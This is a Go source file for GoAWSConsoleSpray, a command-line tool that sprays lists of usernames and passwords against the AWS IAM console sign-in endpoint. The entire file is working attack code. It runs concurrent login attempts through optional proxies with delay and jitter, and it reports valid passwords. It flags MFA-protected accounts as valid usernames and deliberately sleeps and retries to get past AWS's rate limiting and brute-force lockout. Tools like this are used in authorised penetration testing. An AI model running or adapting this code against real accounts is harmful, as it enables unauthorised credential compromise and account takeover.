// SPDX-License-Identifier: GPL-3.0-or-later
package cmd

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand/v2"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/projectdiscovery/retryablehttp-go"
	"github.com/spf13/cobra"
)

// AWS Login Response JSON Structure as of 6/10/2022
type AwsLoginResponse struct {
	State      string `json:"state"`
	Properties struct {
		Result      string `json:"result"`
		RedirectURL string `json:"redirectUrl"`
		Text        string `json:"text"`
		MFAType     string `json:"mfaType"`
	} `json:"properties"`
}

// User Details Structure
type userDetails struct {
	UserName  string
	AccountID string
}

// status codes enum for error handling
type ReturnStatus int64

const (
	SUCCESS    ReturnStatus = 0
	ACCOUNTMFA              = 1
	FAILED                  = 2
	CONNFAIL                = 3
)

var (
	fUserfile      string
	fPassfile      string
	fAccountID     string
	fProxy         string
	fStopOnSuccess bool
	fSleep         int
	fworkers       int
	fDelay         int
	fJitter        int
	fUserAgent     string

	signinURL = "https://signin.aws.amazon.com/authenticate"
	title     = "GoAWSConsoleSpray"

	rootCmd = &cobra.Command{
		Use:   title,
		Short: "A tool used to spray against AWS IAM Console Credentials",
		Long: `
	GoAWSConsoleSpray is used to spray AWS IAM console credentials from
	a list of usernames and passwords. The tool will detect valid usernames
	if those accounts are configured with MFA enabled. If no MFA, it will 
	detect successful login attempts. Accounts configured with MFA cannot
	be sprayed at this time.
	
	Example: GoAWSConsoleSpray -u users.txt -p pws.txt -a 123456789012`,

		Run: func(cmd *cobra.Command, args []string) {
			spray()
		},
	}
)

func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {
	log.SetOutput(os.Stdout)
	rootCmd.Flags().StringVarP(&fAccountID, "accountID", "a", "", "AWS Account ID (required unless username is ARN)")
	rootCmd.Flags().StringVarP(&fUserfile, "userfile", "u", "", "Username string or file (required) can be user, arn, or acctId:user format")
	rootCmd.Flags().StringVarP(&fPassfile, "passfile", "p", "", "Password string or file (required)")
	rootCmd.Flags().IntVarP(&fSleep, "sleep", "z", 0, "Optional Time to sleep between spraying each a password ")
	rootCmd.Flags().IntVarP(&fDelay, "delay", "d", 0, "Optional Time Delay between login requests")
	rootCmd.Flags().IntVarP(&fJitter, "jitter", "j", 0, "Optional Time Jitter Between Requests (0 to n)")
	rootCmd.Flags().StringVarP(&fProxy, "proxy", "x", "", "HTTP or Socks proxy URL & Port. Schema: proto://ip:port")
	rootCmd.Flags().BoolVarP(&fStopOnSuccess, "stopOnSuccess", "s", false, "Stop password spraying on successful hit")
	rootCmd.Flags().IntVarP(&fworkers, "workers", "w", 5, "Optional Time to sleep between password requests")
	rootCmd.Flags().StringVarP(&fUserAgent, "userAgent", "U", "GoAWSConsoleSpray", "Optional User-Agent header")

	rootCmd.MarkFlagRequired("userfile")
	rootCmd.MarkFlagRequired("passfile")
}

func readUserDetails(fUserfile string, fAccountID string) ([]userDetails, error) {
	var usernameList []userDetails

	// Try to open as a file
	file, err := os.Open(fUserfile)
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			user, err := parseUserString(line, fAccountID)
			if err != nil {
				return nil, err
			}
			usernameList = append(usernameList, user)
		}
		if err := scanner.Err(); err != nil {
			return nil, fmt.Errorf("Reading Userfile Failure: %s", err.Error())
		}
		return usernameList, nil
	}

	// Not a file, treat as a string
	user, err := parseUserString(fUserfile, fAccountID)
	if err != nil {
		return nil, err
	}
	usernameList = append(usernameList, user)
	return usernameList, nil
}

// Helper function to parse a user string into userDetails
func parseUserString(input string, fAccountID string) (userDetails, error) {
	var user userDetails
	input = strings.TrimSpace(input)
	arnPattern := regexp.MustCompile(`^arn:aws:iam::(\d{12}):user/(.+)$`)
	colonPattern := regexp.MustCompile(`^(\d{12}):(.+)$`)

	if matches := arnPattern.FindStringSubmatch(input); matches != nil {
		user.AccountID = matches[1]
		user.UserName = matches[2]
	} else if matches := colonPattern.FindStringSubmatch(input); matches != nil {
		user.AccountID = matches[1]
		user.UserName = matches[2]
	} else {
		if fAccountID == "" {
			return user, fmt.Errorf("AccountID not provided in username or CLI argument")
		}
		user.AccountID = fAccountID
		user.UserName = input
	}
	return user, nil
}

func readPasswordDetails(fPassfile string) ([]string, error) {
	var passwordList []string
	var passString string

	passfileHandle, err := os.Open(fPassfile)
	if err != nil {
		passString = fPassfile
	}
	defer passfileHandle.Close()

	if len(passString) == 0 {
		scanner := bufio.NewScanner(passfileHandle)
		for scanner.Scan() {
			passwordList = append(passwordList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			return nil, fmt.Errorf("Reading Passfile Failure: %s", err.Error())
		}
	} else {
		passwordList = []string{passString}
	}

	return passwordList, nil
}

func spray() {
	// Tweak these options as needed if spraying faster or for better network handling w/ retries
	// http client setup
	opts := retryablehttp.DefaultOptionsSingle
	opts.RetryMax = 0
	transport := retryablehttp.DefaultHostSprayingTransport()

	if fProxy != "" {
		proxyURL, parseErr := url.Parse(fProxy)
		if parseErr != nil {
			log.Printf("\t[!] ERROR:\tProxy schema error. \tMessage: %s", parseErr.Error())
			return
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := retryablehttp.NewWithHTTPClient(&http.Client{
		Transport: transport,
	}, opts)

	usernameList, err := readUserDetails(fUserfile, fAccountID)
	if err != nil {
		log.Printf("\t[!] ERROR:\t%s", err.Error())
		return
	}

	passwordList, err := readPasswordDetails(fPassfile)
	if err != nil {
		log.Printf("\t[!] ERROR:\t%s", err.Error())
		return
	}

	// Spraying Loop
	log.Printf("%s: users loaded: [%d] passwords loaded: [%d] potential login requests [%d]", title, len(usernameList), len(passwordList), (len(usernameList) * len(passwordList)))
	log.Printf("%s: Delay [%d] Jitter [%d] Sleep [%d] Proxy [%s] StopOnSuccess [%t] Workers [%d]", title, fDelay, fJitter, fSleep, fProxy, fStopOnSuccess, fworkers)

	// Create a channel to distribute work
	workChan := make(chan struct {
		user userDetails
		pass string
	})

	// Create a WaitGroup to wait for all workers to finish
	var wg sync.WaitGroup

	// Start worker goroutines
	for i := 0; i < fworkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for work := range workChan {
				check := attemptLogin(client, work.user.UserName, work.pass, work.user.AccountID, fDelay, fJitter, 1)
				// connection failures and stop on success
				if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS) {
					close(workChan)
					return
				}
				// skip the user if MFA is required, or a valid password was found
				if check == ACCOUNTMFA || check == SUCCESS {
					continue
				}
			}
		}()
	}

	// Distribute work to the workers
	for _, pass := range passwordList {
		for _, user := range usernameList {
			workChan <- struct {
				user userDetails
				pass string
			}{user, pass}
		}
	}

	// Close the work channel and wait for all workers to finish
	close(workChan)
	wg.Wait()
}

func attemptLogin(client *retryablehttp.Client, username string, password string, accountID string, delay int, jitter int, bfSleepRounds int) ReturnStatus {
	// check against empty strings from the file
	if len(username) < 1 || len(password) < 1 {
		return FAILED
	}

	// add rate limiting
	if delay > 0 {
		time.Sleep(time.Duration(delay) * time.Second)
	}

	// add jitter
	if jitter > 0 {
		time.Sleep(time.Duration(rand.IntN(jitter)) * time.Second)
	}

	// post params
	params := url.Values{}
	params.Set("action", "iam-user-authentication")
	params.Set("account", accountID)
	params.Set("username", username)
	params.Set("password", password)
	params.Set("client_id", "arn:aws:signin:::console/canvas")
	params.Set("redirect_uri", "https://console.aws.amazon.com")
	params.Set("rememberAccount", "false")

	// send the request
	req, err := retryablehttp.NewRequest("POST", signinURL, strings.NewReader(params.Encode()))
	if err != nil {
		log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tRequest creation failed. \tMessage: %s", accountID, username, err.Error())
		return CONNFAIL
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", fUserAgent)

	resp, err := client.Do(req)

	// AWS on successful requests sets the response headers to >4kb, which breaks the HTTP Transport...
	// If this exception occurs, that means a valid password was observed as a bunch of long cookies are made.
	if err != nil {
		if strings.Contains(err.Error(), "server response headers exceeded") {
			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", accountID, username, password)
			return SUCCESS
		} else {
			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tHTTP Stack Failure. \tMessage: %s", accountID, username, err.Error())
			return CONNFAIL
		}
	} else {
		defer resp.Body.Close()

		// check for bruteforce ratelimiting
		if resp.StatusCode == 429 {
			log.Printf("[!] WARNING:\tarn:aws:iam::%s:user/%s\tSending requests too quickly! Sleeping for 4 seconds to get around rate limiting...\n", accountID, username)
			time.Sleep(4 * time.Second)
			return attemptLogin(client, username, password, accountID, delay, jitter, 1)
		}

		// Unmarshal the JSON response from AWS
		body, _ := io.ReadAll(resp.Body)
		var loginResponse AwsLoginResponse
		if err2 := json.Unmarshal(body, &loginResponse); err2 != nil {
			log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tUnmarshal JSON Failure. AWS probably changed JSON response structure. \tMessage: %s", accountID, username, err.Error())
			return FAILED
		}

		// Check for success and failure conditions
		if loginResponse.State == "SUCCESS" {
			if loginResponse.Properties.Result == "MFA" {
				log.Printf("[*] MFA:\tarn:aws:iam::%s:user/%s\tValid username detected. Account Requires MFA. Skipping this user.\n", accountID, username)
				return ACCOUNTMFA
			}
			log.Printf("[+] SUCCESS:\tarn:aws:iam::%s:user/%s\tValid Password: %s \tMFA: false\n", accountID, username, password)
			return SUCCESS
		} else {
			if strings.Contains(loginResponse.Properties.Text, "many invalid passwords have been used") {
				log.Printf("[!] WARNING:\tAWS Account Bruteforce Ratelimit! Sleeping for %d seconds to get around this issue...\n", (5 * bfSleepRounds))
				time.Sleep(time.Duration(5*bfSleepRounds) * time.Second)

				// increase the time delay since we have hit the bruteforce ratelimit check
				return attemptLogin(client, username, password, accountID, delay, jitter, (bfSleepRounds + 1))
			}
			log.Printf("[-] FAIL:\tarn:aws:iam::%s:user/%s\tInvalid Password: %s\n", accountID, username, password)
			return FAILED
		}
	}
}
